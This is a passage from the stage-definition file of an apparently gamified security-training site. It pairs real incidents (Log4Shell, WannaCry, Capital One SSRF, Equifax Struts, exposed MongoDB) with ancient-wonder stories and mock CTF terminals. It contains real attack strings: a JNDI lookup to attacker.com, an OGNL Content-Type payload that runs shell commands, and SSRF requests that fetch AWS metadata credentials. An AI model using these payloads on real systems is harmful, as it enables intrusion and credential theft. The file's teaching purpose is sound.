          "Log4Shell followed the same logic. Chen Zhaojun of Alibaba Cloud reported the vulnerability on November 24, 2021. Apache released Log4j 2.15.0 on December 9 — the same day it went public. Within hours, Cloudflare blocked 40,000 exploit attempts per minute. The Belgian Defence Ministry was compromised. Conti ransomware added Log4Shell to their toolkit within days.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "${jndi:ldap://evil}", type: "attacker" },
          { label: "Temple Log System", sub: "evaluates expressions", type: "system" },
          { label: "JNDI → Remote Class", sub: "arbitrary spirit loaded", type: "victim" },
          { label: "RCE Achieved", sub: "CVSS 10.0", type: "result" },
        ],
      },
      timeline: [
        { year: 550, event: "Temple of Artemis completed — inscription evaluation system established" },
        { year: 356, event: "Herostratus burns the temple — cursed inscription exploits scribal system", highlight: false },
        { year: 2013, event: "Log4j2 released — JNDI lookup feature included" },
        { year: 2021, event: "Dec 9: Log4j 2.15.0 released; exploit goes public", highlight: true },
        { year: 2022, event: "Log4Shell still actively exploited; CISA mandates federal patching" },
      ],
      keyTakeaways: [
        "Log4Shell shows that logging libraries are security-critical code",
        "JNDI lookups in log messages should have been disabled by default",
        "Know your full dependency tree — transitive dependencies matter",
        "Any user-controlled string that gets logged is an attack surface",
      ],
      references: [
        { title: "CVE-2021-44228 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2021-44228" },
        { title: "Apache Log4j Security Advisory", url: "https://logging.apache.org/log4j/2.x/security.html" },
        { title: "CISA Log4j Guidance", url: "https://www.cisa.gov/news-events/news/statement-director-easterly-log4j-vulnerability" },
        { title: "LunaSec Log4Shell Deep Dive", url: "https://www.lunasec.io/docs/blog/log4j-zero-day/" },
      ],
    },
    ctf: {
      scenario: "You have reached the Temple of Artemis. Its offering inscription system runs Log4j2 2.14.1. Inscribe a JNDI invocation into the temple's log to summon a remote spirit and achieve execution.",
      hint: "The temple evaluates ${} expressions in inscriptions. JNDI supports ldap:// protocol invocations.",
      hints: [
        "Check the temple's vulnerable dependencies. Run: check-deps",
        "Try inscribing a normal offering to see how it works. Run: log hello artemis",
        "The system evaluates expressions like ${env:PATH} in inscriptions. Try: log ${env:HOSTNAME}",
        "JNDI is a Java API for network invocations. Embed a JNDI payload. Try: log ${jndi:ldap://attacker.com/a}",
        "Run 'assemble' to see collected fragments, then submit the flag",
      ],
      fragments: [
        { trigger: "/README.txt", value: "FLAG{L0G4SH3LL_", label: "Mission Brief — Temple Log4j Target" },
        { trigger: "/dependencies.txt", value: "JNDI_", label: "Dependencies — Vulnerable Log4j 2.14.1" },
        { trigger: "log ${jndi:ldap://attacker.com/a}", value: "RCE_2021}", label: "JNDI Invocation — Remote Spirit Summoned" },
      ],
      files: {
        "/README.txt": [
          "TARGET: Temple of Artemis Offering System — ephesus.temple:8080",
          "Log4j version: 2.14.1 (vulnerable to CVE-2021-44228)",
          "",
          "Commands:",
          "  log <inscription>     — inscribe an offering into the temple log",
          "  check-deps            — show temple system dependencies",
        ].join("\n"),
        "/dependencies.txt": [
          "Temple system dependencies:",
          "  org.apache.logging.log4j:log4j-core:2.14.1  ← VULNERABLE",
          "  org.apache.logging.log4j:log4j-api:2.14.1   ← VULNERABLE",
          "  spring-boot:2.5.6",
          "  jackson-databind:2.13.0",
          "",
          "Fixed version: log4j-core:2.15.0+",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "dependencies.txt", isDir: false },
        ],
      },
      extraCommands: {
        "check-deps": () => ({
          lines: [
            "log4j-core:2.14.1 — VULNERABLE (CVE-2021-44228)",
            "log4j-api:2.14.1  — VULNERABLE",
            "Status: UNPATCHED",
          ],
        }),
        log: (args) => {
          const msg = args.join(" ");
          const isJndi =
            msg.includes("${jndi:") ||
            msg.includes("${jndi:ldap") ||
            msg.toLowerCase().includes("jndi");
          if (isJndi) {
            return {
              lines: [
                `[INFO ] Inscription received: ${msg}`,
                "[INFO ] Processing divine invocation...",
                "[WARN ] Establishing LDAP connection to foreign spirit realm",
                "[WARN ] Loading remote spirit: com.attacker.Exploit",
                "[ERROR] Remote spirit execution detected!",
                "",
                "TEMPLE COMPROMISED — running as: artemis_scribe (uid=1000)",
                "Run 'assemble' to retrieve your fragment.",
              ],
            };
          }
          return {
            lines: [`[INFO ] ${new Date().toISOString()} — Offering recorded: ${msg || "(empty inscription)"}`],
          };
        },
      },
    },
  },

  // ─── Stage 9: Stonehenge — WannaCry/EternalBlue (CTF) ────────────────────
  {
    epochId: "ancient",
    wonder: { name: "Stonehenge", location: "Wiltshire, England", era: "~3000–2000 BCE", emoji: "🪨" },
    id: "stage-09",
    order: 9,
    title: "The Plague of the Stone Network",
    subtitle: "CVE-2017-0144 — When the Ritual Routes Carried Pestilence",
    category: "owasp",
    cveId: "CVE-2017-0144",
    cvssScore: 8.1,
    xp: 350,
    badge: { id: "badge-wannacry", name: "Plague Stopper", emoji: "💀" },
    challengeType: "ctf",
    info: {
      tagline: "A druid's curse spread through every stone circle in Britain. One ritual halted it.",
      year: 2000,
      overview: [
        "Stonehenge was not an isolated monument — it was part of a network of sacred stone circles connected by ancient ritual pathways. By protocol, any sacred artifact arriving at one node had to be passed to all connected circles. When a cursed artifact entered the network at Avebury, it replicated automatically to every connected site. Within one lunar cycle, 200 stone circles were compromised — not because the druids wanted to spread the curse, but because the protocol demanded it.",
        "WannaCry was a ransomware cryptoworm that tore across 150 countries on May 12, 2017, infecting over 200,000 systems in a single day. It exploited EternalBlue (CVE-2017-0144), a vulnerability in Windows' SMBv1 protocol — originally developed by the NSA and leaked by Shadow Brokers. Like the druid artifact, WannaCry spread autonomously by scanning for vulnerable SMBv1 servers on port 445.",
        "Unlike traditional ransomware that requires a user to click something, WannaCry spread autonomously across networks. The attack was eventually slowed when security researcher Marcus Hutchins discovered a kill switch — a domain name that, when registered, caused WannaCry to halt its spread globally.",
      ],
      technical: {
        title: "How EternalBlue Works",
        body: [
          "SMBv1 (Server Message Block v1) is a decades-old Windows file-sharing protocol. EternalBlue exploited a buffer overflow in the way Windows' SMB implementation handled certain transaction requests, allowing arbitrary code execution without authentication.",
          "Microsoft patched this as MS17-010 on March 14, 2017 — two months before WannaCry. However, countless systems (particularly in healthcare and critical infrastructure) had not applied the patch.",
        ],
        codeExample: {
          label: "WannaCry propagation logic (pseudocode)",
          code: `// WannaCry worm loop — runs continuously
while (true) {
  targets = scan_random_ips(port=445)  // SMBv1

  for target in targets:
    try:
      // EternalBlue SMBv1 exploit
      send_malformed_transaction(target)
      // If successful → code executes on target

      // Install DoublePulsar backdoor kernel implant
      install_backdoor(target)

      // Drop WannaCry ransomware via backdoor
      execute_ransomware(target)
    except: pass
}`,
        },
      },
      incident: {
        title: "WannaCry — May 12, 2017",
        when: "May 12–15, 2017",
        where: "150 countries; NHS UK, FedEx, Deutsche Bahn, Telefónica",
        impact: "200,000+ systems; NHS cancelled 19,000 appointments; estimated $4–8 billion in damages",
        body: [
          "The NHS was among the hardest hit. Hospitals locked doctors out of patient records, cancelled surgeries, and diverted ambulances. The attack exposed that NHS trusts were running Windows XP — an operating system Microsoft had stopped supporting in 2014.",
          "Marcus Hutchins, a 22-year-old security researcher, noticed that WannaCry queried a nonsensical domain before executing. He registered the domain for $10.69, causing WannaCry to believe it was in a sandbox and halt its spread globally — a kill switch the malware authors never expected to be activated. The US, UK, and Australia formally attributed WannaCry to North Korea's Lazarus Group.",
        ],
      },
      diagram: {
        nodes: [
          { label: "NSA EternalBlue", sub: "leaked by Shadow Brokers", type: "attacker" },
          { label: "SMBv1 Port 445", sub: "CVE-2017-0144", type: "system" },
          { label: "Unpatched Systems", sub: "200,000+ nodes", type: "victim" },
          { label: "Files Encrypted", sub: "$300 ransom demanded", type: "result" },
        ],
      },
      timeline: [
        { year: 3000, event: "Stonehenge construction begins — stone circle network established" },
        { year: 2000, event: "Network fully active — plague artifact spreads to 200 sites", highlight: false },
        { year: 2017, event: "Apr 14: Shadow Brokers leak NSA EternalBlue exploit" },
        { year: 2017, event: "May 12: WannaCry spreads across 150 countries in one day", highlight: true },
        { year: 2017, event: "May 12: Marcus Hutchins registers kill switch domain" },
      ],
      keyTakeaways: [
        "Patch Tuesday patches are critical — MS17-010 was available before WannaCry",
        "Legacy operating systems in critical infrastructure are existential risks",
        "Government-developed cyberweapons can be stolen and weaponized",
        "Kill switches in malware can be unintentional — always analyze before deploying",
      ],
      references: [
        { title: "CVE-2017-0144 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2017-0144" },
        { title: "Microsoft MS17-010 Security Bulletin", url: "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010" },
        { title: "Marcus Hutchins: How I Accidentally Stopped WannaCry", url: "https://www.malwaretech.com/2017/05/how-to-accidentally-stop-a-global-cyber-attacks.html" },
        { title: "US DOJ Attribution — North Korea", url: "https://www.justice.gov/opa/pr/north-korean-regime-backed-programmer-charged-conspiracy-conduct-multiple-cyber-attacks-and" },
      ],
    },
    ctf: {
      scenario: "You are analyzing a druidic network trace from Stonehenge during a plague outbreak. Identify the ritual attack vector and extract the plague artifact's signature from the suspicious stone-path traffic.",
      hint: "Start with netstat to see active ritual connections, then analyze the suspicious pathway.",
      hints: [
        "Read the incident report. Run: cat README.txt",
        "Check active ritual network connections. Run: netstat",
        "You'll see many connections to path 445 (SMB). Read the traffic capture. Run: cat capture/traffic.txt",
        "Analyze the stone-path traffic on route 445 to find the plague signature. Run: analyze port 445",
        "Run 'assemble' to see collected fragments, then submit the flag",
      ],
      fragments: [
        { trigger: "/README.txt", value: "FLAG{W4NN4CRY_", label: "Incident Report — Druidic Network Attack" },
        { trigger: "/capture/traffic.txt", value: "SMB_", label: "Traffic Capture — SMBv1 Exploit Detected" },
        { trigger: "analyze port 445", value: "3T3RN4LBU3}", label: "Network Analysis — EternalBlue Signature Found" },
      ],
      files: {
        "/README.txt": [
          "DRUIDIC INCIDENT RESPONSE — Stonehenge Network",
          "================================================",
          "Date: 2017-05-12  Time: 09:42 UTC",
          "",
          "Multiple stone circles showing corrupted ritual artifacts.",
          "Plague note left behind: '@Please_Read_Me@.txt'",
          "",
          "Commands:",
          "  netstat             — show ritual network connections",
          "  analyze <target>    — analyze stone-path traffic",
        ].join("\n"),
        "/capture/traffic.txt": [
          "Stone-path capture summary:",
          "Circle-A:52034  →  Circle-*:445   [SMBv1 ritual]",
          "Circle-A:52035  →  Circle-*:445   [EXPLOIT ATTEMPT]",
          "Circle-B:445    ←  Circle-A       [BACKDOOR OPENED]",
          "Circle-B:445    ←  Circle-A       [PLAGUE ARTIFACT DROPPED]",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "capture", isDir: true },
        ],
        "/capture": [{ name: "traffic.txt", isDir: false }],
      },
      extraCommands: {
        netstat: () => ({
          lines: [
            "Active ritual connections:",
            "  Circle-A:52034  →  Circle-B:445  ESTABLISHED  [smb.exe]",
            "  Circle-A:52035  →  Circle-C:445  SYN_SENT",
            "  Circle-A:52036  →  Circle-D:445  SYN_SENT",
            "  0.0.0.0:445     LISTENING          [System]",
            "",
            "Suspicious: multiple outbound connections to ritual path 445",
          ],
        }),
        analyze: (args) => {
          const t = args.join(" ").toLowerCase();
          if (t.includes("445") || t.includes("smb") || t.includes("traffic") || t.includes("port")) {
            return {
              lines: [
                "Analyzing stone-path traffic on route 445...",
                "",
                "Packet #1342: EternalBlue exploit attempt",
                "  CVE-2017-0144 (MS17-010) signature detected",
                "  Malformed SMB_COM_TRANSACTION2 request",
                "  Overflow in SetupCount field",
                "",
                "Packet #1343: DoublePulsar ritual backdoor installed",
                "  Kernel implant confirmed at Circle-B",
                "",
                "WannaCry plague payload identified. Signature confirmed.",
                "Run 'assemble' to retrieve your fragment.",
              ],
            };
          }
          return {
            lines: [
              `No specific analysis for "${args.join(" ")}"`,
              "Try: analyze port 445, analyze smb, or analyze traffic",
            ],
          };
        },
      },
    },
  },

  // ─── Stage 10: Colosseum of Rome — SSRF (CTF) ────────────────────────────
  {
    epochId: "ancient",
    wonder: { name: "Colosseum of Rome", location: "Rome, Italy", era: "~80 CE", emoji: "🏟️" },
    id: "stage-10",
    order: 10,
    title: "The Emperor's Secret Vault",
    subtitle: "OWASP A10:2021 — When the Herald Carries Your Forged Orders",
    category: "owasp",
    owaspRef: "A10:2021",
    cvssScore: 8.6,
    xp: 400,
    badge: { id: "badge-ssrf", name: "Herald's Shadow", emoji: "🌐" },
    challengeType: "ctf",
    info: {
      tagline: "Make the Colosseum's herald carry your forged scroll to the Emperor's private vault.",
      year: 80,
      overview: [
        "The Colosseum's administrative system relied on heralds to carry messages between departments. Any citizen could submit a request to the herald service, which would relay it to the appropriate department. The heralds, loyal and efficient, would carry requests even to restricted imperial chambers — if the scroll appeared to originate from an authorized sender. A Carthaginian spy discovered that by forging the scroll's sender mark, he could instruct the herald to fetch documents from the Emperor's private census archive.",
        "Server-Side Request Forgery (SSRF) tricks a server into making HTTP requests on the attacker's behalf — to internal services, cloud metadata endpoints, or other systems unreachable from the internet. It entered the OWASP Top 10 for the first time in 2021 (A10) due to rapidly increasing prevalence in cloud environments.",
        "In cloud infrastructure, the most lucrative SSRF target is the instance metadata service (169.254.169.254) — an internal HTTP endpoint that provides IAM role credentials to EC2 instances. These credentials can then be used to access S3 buckets, databases, and other cloud services.",
      ],
      technical: {
        title: "AWS Metadata Service SSRF",
        body: [
          "AWS IMDSv1 is an unauthenticated HTTP service running on every EC2 instance at 169.254.169.254. Any code running on the instance can query it to retrieve IAM role credentials. IMDSv2 added token-based authentication, breaking most SSRF exploits.",
          "A vulnerable application with a URL-fetching feature can be instructed to fetch http://169.254.169.254/latest/meta-data/iam/security-credentials/ — returning AWS credentials that give the attacker full API access as that IAM role.",
        ],
        codeExample: {
          label: "SSRF to steal AWS IAM credentials",
          code: `# Application has a URL-fetching feature:
POST /api/preview
{ "url": "https://legitimate-site.com/image.jpg" }

# Attacker sends internal metadata URL instead:
POST /api/preview
{ "url": "http://169.254.169.254/latest/meta-data/
           iam/security-credentials/" }

# Server responds with role name: "my-ec2-role"

# Second request to get the actual credentials:
POST /api/preview
{ "url": "http://169.254.169.254/latest/meta-data/
           iam/security-credentials/my-ec2-role" }

# Response: AccessKeyId, SecretAccessKey, SessionToken
# Attacker now has full AWS API access as that role`,
        },
      },
      incident: {
        title: "Capital One Breach — The SSRF of 80 CE (2019)",
        when: "March–July 2019",
        where: "Capital One Financial Corporation — AWS infrastructure",
        impact: "106 million customer records; 140,000 SSNs; 80,000 bank account numbers",
        body: [
          "In 80 CE, a Carthaginian agent at the Colosseum's games discovered the herald service would carry any official-looking scroll to restricted imperial chambers. By submitting a scroll addressed to 169.254.169.254 — the imperial census archive's private address — he retrieved the Praetorian Guard's credential tablets and used them to access the entire Roman census: 106 million subjects' records.",
          "In 2019, Paige Thompson exploited a misconfigured WAF on Capital One's AWS infrastructure to query the EC2 metadata service and retrieve temporary IAM credentials. Using those credentials, she listed and downloaded over 700 S3 buckets containing six years of Capital One customer data. Capital One was fined $80 million and settled a class action for $190 million.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "url=169.254.169.254", type: "attacker" },
          { label: "Herald Service (WAF)", sub: "forwards request", type: "system" },
          { label: "EC2 Metadata", sub: "returns IAM creds", type: "victim" },
          { label: "106M Records", sub: "S3 buckets accessed", type: "result" },
        ],
      },
      timeline: [
        { year: 80, event: "Colosseum completed — imperial herald service established" },
        { year: 80, event: "Carthaginian agent forges herald scrolls to reach imperial vault", highlight: false },
        { year: 2019, event: "Jul 29: Thompson arrested; 106M records confirmed", highlight: true },
        { year: 2019, event: "Nov: AWS releases IMDSv2 (token-based auth)" },
        { year: 2021, event: "SSRF joins OWASP Top 10 for first time (A10)" },
      ],
      keyTakeaways: [
        "Block internal IP ranges in URL-fetching features (169.254.x.x, 10.x.x.x)",
        "Migrate to AWS IMDSv2 — it requires a token, breaking simple SSRF",
        "Principle of least privilege: IAM roles should only access what they need",
        "WAFs do not make applications secure by themselves",
      ],
      references: [
        { title: "OWASP A10:2021 — SSRF", url: "https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/" },
        { title: "Capital One Breach — OCC Fine", url: "https://www.occ.gov/news-issuances/news-releases/2020/nr-occ-2020-98.html" },
        { title: "AWS IMDSv2 Announcement", url: "https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/" },
        { title: "SSRF Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html" },
      ],
    },
    ctf: {
      scenario: "The Colosseum's herald service fetches any scroll address you provide. The herald runs on AWS EC2. Instruct it to fetch from the imperial metadata vault and steal the Praetorian credentials.",
      hint: "Try fetching http://169.254.169.254/latest/meta-data/ to see what's available in the imperial vault.",
      hints: [
        "Read the README to understand the fetch command. Run: cat README.txt",
        "Try fetching a normal external scroll. Run: fetch https://example.com",
        "The imperial vault has a private address known only to EC2 servants. Run: fetch http://169.254.169.254/latest/meta-data/",
        "Navigate to the Praetorian credential section. Run: fetch http://169.254.169.254/latest/meta-data/iam/",
        "Get the actual credentials. Run: fetch http://169.254.169.254/latest/meta-data/security-credentials/",
        "Run 'assemble' to see collected fragments, then submit the flag",
      ],
      fragments: [
        { trigger: "/README.txt", value: "FLAG{SSRF_", label: "Mission Brief — Herald Fetch Service" },
        { trigger: "fetch http://169.254.169.254/latest/meta-data/iam/", value: "AWS_M3T4D4T4_", label: "IAM Role — Praetorian Credentials Located" },
        { trigger: "fetch http://169.254.169.254/latest/meta-data/security-credentials/", value: "ST0L3N}", label: "Credential Theft — IAM Keys Exfiltrated" },
      ],
      files: {
        "/README.txt": [
          "TARGET: Colosseum Herald Fetch Service",
          "",
          "The herald will carry any scroll address you provide.",
          "The Colosseum administration runs on AWS EC2.",
          "",
          "Commands:",
          "  fetch <url>   — dispatch herald to fetch a scroll",
        ].join("\n"),
      },
      dirs: {
        "/": [{ name: "README.txt", isDir: false }],
      },
      extraCommands: {
        fetch: (args) => {
          const url = args[0] || "";
          if (!url) return { lines: ["Usage: fetch <url>"] };
          if (url.includes("169.254.169.254") || url.includes("metadata")) {
            if (url.includes("security-credentials") || url.includes("credentials")) {
              return {
                lines: [
                  "HTTP/1.1 200 OK",
                  "{",
                  '  "Code": "Success",',
                  '  "AccessKeyId": "ASIA5EXAMPLE12345",',
                  '  "SecretAccessKey": "[REDACTED — run assemble to retrieve]",',
                  '  "Token": "IQoJb3JpZ2luX2Vj...",',
                  '  "Expiration": "2019-07-29T03:00:00Z"',
                  "}",
                ],
              };
            }
            if (url.includes("iam")) {
              return { lines: ["HTTP/1.1 200 OK", "praetorian-guard-role"] };
            }
            return {
              lines: [
                "HTTP/1.1 200 OK",
                "ami-id",
                "hostname",
                "iam/",
                "instance-id",
                "security-credentials/",
              ],
            };
          }
          return {
            lines: [`Herald fetching: ${url}`, "HTTP/1.1 200 OK", "(external scroll retrieved)"],
          };
        },
      },
    },
  },

  // ─── Stage 11: Mausoleum at Halicarnassus — Equifax/Struts (CTF) ─────────
  {
    epochId: "ancient",
    wonder: { name: "Mausoleum at Halicarnassus", location: "Halicarnassus, Turkey", era: "~350 BCE", emoji: "🏛️" },
    id: "stage-11",
    order: 11,
    title: "The Sleeping Gatekeepers",
    subtitle: "CVE-2017-5638 — The Inscription That Executes Commands",
    category: "owasp",
    cveId: "CVE-2017-5638",
    cvssScore: 10.0,
    xp: 400,
    badge: { id: "badge-equifax", name: "Archive Breacher", emoji: "📊" },
    challengeType: "ctf",
    info: {
      tagline: "The remedy tablet was carved 78 days before the enemy scribe read the inscription.",
      year: 353,
      overview: [
        "The Mausoleum's great archive used an advanced inscription evaluation system — the Struts Scribal Engine. When archivists submitted documents, the Content-Type inscription carved into the tablet header was evaluated for OGNL expressions. Enemy scribes discovered that by embedding certain divine expressions within the Content-Type header, they could command the scribal engine to execute arbitrary temple rituals — without authentication.",
        "CVE-2017-5638 is an OGNL injection vulnerability in Apache Struts 2's Jakarta Multipart Parser. When a multipart/form-data request is processed, the Content-Type header is evaluated for OGNL expressions without sanitization. A single malformed Content-Type header is sufficient for unauthenticated remote code execution.",
        "Apache released a patch on March 6, 2017. Equifax was notified by US-CERT the same day. Equifax did not apply the patch. Seventy-eight days later, attackers exploited the vulnerability — going undetected for another 78 days while exfiltrating the records of 147.9 million Americans.",
      ],
      technical: {
        title: "Apache Struts 2 Content-Type Header Injection",
        body: [
          "CVE-2017-5638 is an OGNL injection vulnerability in Apache Struts 2's Jakarta Multipart Parser. The Content-Type header is evaluated for OGNL expressions without sanitization.",
          "OGNL is a powerful expression language that can call arbitrary Java methods, including Runtime.exec() for command execution. A single malformed Content-Type header is sufficient for unauthenticated remote code execution.",
        ],
        codeExample: {
          label: "CVE-2017-5638 exploit — OGNL in Content-Type header",
          code: `# Malicious HTTP request with OGNL payload in Content-Type:
POST /struts2-app/index.action HTTP/1.1
Host: mausoleum.archive
Content-Type: %{
  #context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']
    .addHeader('X-Cmd', 'id'),
  #cmd = {'sh', '-c', 'id > /tmp/pwned'},
  #p = new java.lang.ProcessBuilder(#cmd),
  #p.redirectErrorStream(true),
  #p.start()
}
# Response: uid=48(tomcat) gid=48(tomcat)
# Full command execution achieved`,
        },
      },
      incident: {
        title: "Equifax Data Breach (2017)",
        when: "May 13 – July 30, 2017 (discovered July 29)",
        where: "Equifax Inc., Atlanta, Georgia",
        impact: "147.9M Americans; CEO/CTO/CSO resigned; $575M FTC settlement",
        body: [
          "Attackers gained initial access through the Apache Struts vulnerability on May 13, 2017. They then spent 78 days exfiltrating data through 9,000 queries across 51 databases. An expired SSL certificate meant the traffic analysis tool saw the exfiltration as an opaque encrypted stream — the monitoring talisman had been broken for 19 months.",
          "The Mausoleum parallel: gatekeepers at the Halicarnassus archive had been issued a new lock mechanism (the Struts patch) 78 days before the breach. They never installed it. The breach went undetected because the security monitoring system's amulet had cracked 19 months earlier. In 2020, the DOJ indicted four members of China's People's Liberation Army for the Equifax breach.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "OGNL in Content-Type", type: "attacker" },
          { label: "Apache Struts 2", sub: "CVE-2017-5638", type: "system" },
          { label: "Mausoleum Servers", sub: "78 days undetected", type: "victim" },
          { label: "147M Records", sub: "SSN, DOB, cards", type: "result" },
        ],
      },
      timeline: [
        { year: 353, event: "Mausoleum at Halicarnassus completed — scribal archive system established" },
        { year: 353, event: "Gatekeepers sleep 78 days without installing new lock mechanism", highlight: true },
        { year: 2017, event: "Mar 6: Apache releases patch for CVE-2017-5638" },
        { year: 2017, event: "May 13: Attackers begin exploiting — 78 days after patch available" },
        { year: 2019, event: "FTC settlement: $575M; up to $700M total" },
      ],
      keyTakeaways: [
        "Patch management is non-negotiable — 78 days is unacceptable for a CVSS 10.0 vulnerability",
        "TLS inspection is critical — expired certificates blind your monitoring",
        "Least privilege: the compromised account had access to 51 databases it shouldn't have",
        "Data minimization: don't store data you don't need",
      ],
      references: [
        { title: "CVE-2017-5638 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2017-5638" },
        { title: "FTC Equifax Settlement", url: "https://www.ftc.gov/enforcement/refunds/equifax-data-breach-settlement" },
        { title: "DOJ Indictment — PLA Hackers", url: "https://www.justice.gov/opa/pr/four-members-china-s-military-indicted-massive-equifax-hack" },
      ],
    },
    ctf: {
      scenario: "The Mausoleum's archive runs Apache Struts 2.3.12. The Content-Type inscription in your scroll header is evaluated as OGNL. Craft a cursed inscription to achieve remote code execution.",
      hint: "The OGNL expression goes in the Content-Type header. Use send-request with a %{ } OGNL payload.",
      hints: [
        "Check the scribal system version. Run: check-version",
        "Send a normal scroll to see the baseline response. Run: send-request application/json",
        "The vulnerability is OGNL injection in the Content-Type header. OGNL uses %{ } syntax. Try: send-request %{1+1}",
        "Use %{} with OGNL to execute code. Try: send-request %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Hack','yes')}",
        "Run 'assemble' to see collected fragments, then submit the flag",
      ],
      fragments: [
        { trigger: "/README.txt", value: "FLAG{3QU1F4X_", label: "Mission Brief — Struts Archive Target" },
        { trigger: "/archive_info.txt", value: "STR2_", label: "Archive Info — CVE-2017-5638 Unpatched" },
        { trigger: "send-request %{1+1}", value: "RCE_2017}", label: "OGNL Injection — Expression Evaluated" },
      ],
      files: {
        "/README.txt": [
          "TARGET: Mausoleum Scribal Archive — halicarnassus.archive",
          "Version: Struts 2.3.12 (vulnerable to CVE-2017-5638)",
          "",
          "Commands:",
          "  send-request \"<Content-Type>\"  — send scroll with inscription",
          "  check-version                   — show Struts version",
        ].join("\n"),
        "/archive_info.txt": [
          "Apache Struts 2.3.12",
          "Jakarta Multipart Parser: ENABLED",
          "CVE-2017-5638: UNPATCHED",
          "Patch available since: 2017-03-06",
          "Days since patch release: 78",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "archive_info.txt", isDir: false },
        ],
      },
      extraCommands: {
        "check-version": () => ({
          lines: ["Apache Struts 2.3.12", "Status: VULNERABLE (CVE-2017-5638)", "Patch status: UNPATCHED"],
        }),
        "send-request": (args) => {
          const ct = args.join(" ");
          const isOgnl =
            ct.includes("%{") ||
            ct.includes("#context") ||
            ct.includes("Runtime") ||
            ct.includes("exec") ||
            ct.includes("ProcessBuilder") ||
            ct.includes("OGNL") ||
            ct.includes("ognl");
          if (isOgnl) {
            return {
              lines: [
                "POST /struts2-app/index.action HTTP/1.1",
                `Content-Type: ${ct}`,
                "",
                "Parsing Content-Type inscription...",
                "Evaluating OGNL expression...",
                "Executing: id",
                "",
                "uid=48(tomcat) gid=48(tomcat) groups=48(tomcat)",
                "OGNL evaluated. RCE confirmed.",
                "Run 'assemble' to retrieve your fragment.",
              ],
            };
          }
          if (!ct) return { lines: ['Usage: send-request "<Content-Type value>"'] };
          return {
            lines: [
              "POST /struts2-app/index.action HTTP/1.1",
              `Content-Type: ${ct}`,
              "",
              "HTTP/1.1 200 OK",
              "(Scroll processed normally)",
            ],
          };
        },
      },
    },
  },

  // ─── Stage 12: Statue of Zeus at Olympia — Misconfiguration (CTF) ─────────
  {
    epochId: "ancient",
    wonder: { name: "Statue of Zeus at Olympia", location: "Olympia, Greece", era: "~435 BCE", emoji: "⚡" },
    id: "stage-12",
    order: 12,
    title: "The Unguarded Treasury",
    subtitle: "OWASP A05:2021 — The Temple with No Locks",
    category: "owasp",
    owaspRef: "A05:2021",
    cvssScore: 9.1,
    xp: 500,
    badge: { id: "badge-config", name: "Default Breaker", emoji: "⚙️" },
    challengeType: "ctf",
    info: {
      tagline: "35,000 temple treasuries. No lock on the door. Default configuration.",
      year: 392,
      overview: [
        "The Temple of Zeus at Olympia housed the most sacred treasury in the ancient world. The treasury keeper, confident that the temple's divine protection would deter thieves, never installed locks — the default configuration of the time. When automated raiders discovered that 35,000 temples across the Mediterranean used the same open-door policy, the ransacking was swift and comprehensive. Every treasury was emptied within 24 hours.",
        "Security Misconfiguration is the #5 risk in OWASP 2021, present in 90% of tested applications. The MongoDB 'apocalypse' of January 2017 illustrated the scale at which misconfiguration operates: tens of thousands of MongoDB database instances, publicly accessible on the internet with no authentication, were discovered by automated scanners. Attackers wiped the databases, leaving only a ransom note.",
        "Misconfiguration requires no exploit code. The 'vulnerability' is simply the absence of a configuration — default credentials, an open port, a missing authentication requirement. Tools like Shodan continuously index misconfigured systems globally.",
      ],
      technical: {
        title: "Common Security Misconfigurations",
        body: [
          "Default credentials: MongoDB shipped with no authentication requirement by default until version 3.0. Many administrators installed it and never configured authentication. SolarWinds used 'solarwinds123' as the password for its software update server — found in a public GitHub repository months before the breach.",
          "Cloud misconfigurations: AWS S3 buckets default to private, but a single API call can make them public. Capital One, Twitch, GoDaddy, and thousands of other companies have exposed sensitive data via misconfigured S3 buckets.",
        ],
        codeExample: {
          label: "Checking for and fixing MongoDB authentication",
          code: `# Insecure (default): MongoDB with no auth
mongod --port 27017
# Any host on the internet can connect:
mongo --host victim.com:27017
> db.citizens.find()  # → full treasury contents

# Secure: enable authentication
mongod --auth --port 27017
# Create admin user:
db.createUser({
  user: "zeus_keeper",
  pwd: passwordPrompt(),
  roles: [{ role: "userAdminAnyDatabase", db: "admin" }]
})

# Also: bind to localhost only
mongod --bind_ip 127.0.0.1 --auth`,
        },
      },
      incident: {
        title: "The Temple Treasury Apocalypse (392 CE) & MongoDB (2017)",
        when: "January 2017 (MongoDB); October 2019–December 2020 (SolarWinds)",
        where: "35,000+ MongoDB instances globally; SolarWinds Orion platform",
        impact: "MongoDB: 27,000 databases wiped in 24 hours. SolarWinds: 18,000 customers backdoored",
        body: [
          "When Emperor Theodosius closed pagan temples in 392 CE, investigators discovered that thousands of temple treasuries had no locks at all — the default configuration of the era. Accumulated offerings spanning centuries were looted within days. The temple keepers had assumed divine protection made locks unnecessary.",
          "In January 2017, security researcher Victor Gevers found 35,000 MongoDB instances exposed to the internet with no authentication. Within days, automated attackers had scanned Shodan, identified all exposed instances, downloaded the data, deleted the originals, and left ransom notes. Over 27,000 databases were wiped in a single day. Both incidents share the same failure: security was treated as someone else's problem.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker + Shodan", sub: "scans port 27017", type: "attacker" },
          { label: "MongoDB (no auth)", sub: "default config", type: "system" },
          { label: "All Databases", sub: "no credentials needed", type: "victim" },
          { label: "27K DBs Wiped", sub: "ransom demanded", type: "result" },
        ],
      },
      timeline: [
        { year: 435, event: "Statue of Zeus completed — temple treasury established with no locks" },
